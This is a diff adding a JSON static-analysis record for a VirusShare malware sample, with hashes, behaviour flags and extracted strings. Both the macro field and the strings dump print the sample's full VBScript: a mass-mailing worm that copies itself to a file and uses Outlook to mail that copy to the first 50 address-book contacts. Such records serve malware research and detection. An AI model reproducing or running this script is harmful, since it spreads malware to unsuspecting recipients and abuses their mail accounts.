@@ -1,0 +1,45 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object"
+        },
+        "macro": "On Error Resume Next\nDim x\nso.GetFile(WScript.ScriptFullName).Copy(\"C:\\dateiname.vbs\")\nSet so=CreateObject(\"Scripting.FileSystemObject\")\nSet ol=CreateObject(\"Outlook.Application\")\nFor x=1 To 50\nSet Mail=ol.CreateItem(0)\nMail.to=ol.GetNameSpace(\"MAPI\").AddressLists(1).AddressEntries(x)\nMail.Attachments.Add(\"C:\\dateiname.vbs\")\nNext\nol.quit"
+    },
+    "filename": "VirusShare_43460aa5cac91dee91f47352ee429887",
+    "filesize": 351,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "43460aa5cac91dee91f47352ee429887",
+        "sha1": "ed678f812e10e49515221172537cdf4453e575c7",
+        "sha256": "9835f7b03f1403e1cbd386ef1a2dbff59fe20c53a685254e5710c931a6d7ac96"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On Error Resume Next",
+            "Dim x",
+            "so.GetFile(WScript.ScriptFullName).Copy(\"C:\\dateiname.vbs\")",
+            "Set so=CreateObject(\"Scripting.FileSystemObject\")",
+            "Set ol=CreateObject(\"Outlook.Application\")",
+            "For x=1 To 50",
+            "Set Mail=ol.CreateItem(0)",
+            "Mail.to=ol.GetNameSpace(\"MAPI\").AddressLists(1).AddressEntries(x)",
+            "Mail.Attachments.Add(\"C:\\dateiname.vbs\")",
+            "Next",
+            "ol.quit"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.325424",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
